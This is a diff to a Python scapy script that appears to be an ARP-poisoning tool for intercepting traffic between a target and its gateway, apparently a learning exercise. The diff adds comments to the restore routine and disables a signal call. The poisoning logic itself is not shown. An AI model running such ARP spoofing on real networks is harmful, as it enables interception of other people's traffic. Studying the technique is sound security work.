@@ -1,9 +1,7 @@
-import os
+﻿import os
 import signal
 from scapy.layers.inet import ARP, Ether, srp, send
 import time
-
-
 
 def get_mac(ip_address):
     # Send and receive packets at layer 2
@@ -47,7 +45,9 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
 def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
     print "[*] Restoring target..."
     # using a different method to send (from the one above to poison target)
+    # restore target. state gateway to its real mac
     send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
+    # restore gateway. state target to its real macss
     send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
     # signals the main thread to exit
-    os.kill(os.getpid(), signal.SIGINT) # main? arent we restoring on the main thread?
+    #os.kill(os.getpid(), signal.SIGINT) # main? arent we restoring on the main thread?
